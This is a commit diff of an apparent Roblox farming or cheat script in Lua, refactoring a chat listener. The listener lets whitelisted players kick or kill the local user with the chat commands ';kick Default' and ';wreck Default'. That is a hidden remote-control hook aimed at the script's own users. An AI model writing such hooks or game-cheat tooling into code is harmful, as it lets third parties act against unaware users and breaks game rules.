eb64c6915c7e6259cad7af529e089980dea8baea
SegFaultingRN <Supr3m0s@outlook.com>
2025-02-19 17:21:25 -0700

    Update UJFDfarmv2.lua

--- UJFDfarmv2.lua
+++ UJFDfarmv2.lua
@@ -464,23 +464,20 @@ players.PlayerAdded:Connect(function(player)
 		task.wait(4)
 		game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("....", "All")
 		bruh = player.Name
-		while true do 
-			task.wait() 
-			player.Chatted:Connect(function(message)
-				if table.find(wl,player.UserId) and message == ";kick Default" then
-					game.Players.LocalPlayer:Kick("imagine")
-				end
-				if table.find(wl,player.UserId) and message == ";wreck Default" then
-					game.Players.LocalPlayer.Character.Humanoid.Health = 0
-				end
-			end)
-		end
+	
+		task.wait() 
+		player.Chatted:Connect(function(message)
+			if table.find(wl,player.UserId) and message == ";kick Default" then
+				game.Players.LocalPlayer:Kick("imagine")
+			end
+			if table.find(wl,player.UserId) and message == ";wreck Default" then
+				game.Players.LocalPlayer.Character.Humanoid.Health = 0
+			end
 
+		end)
 	end
 
 end)
-
-
 
 local function x() 
 	print("2")
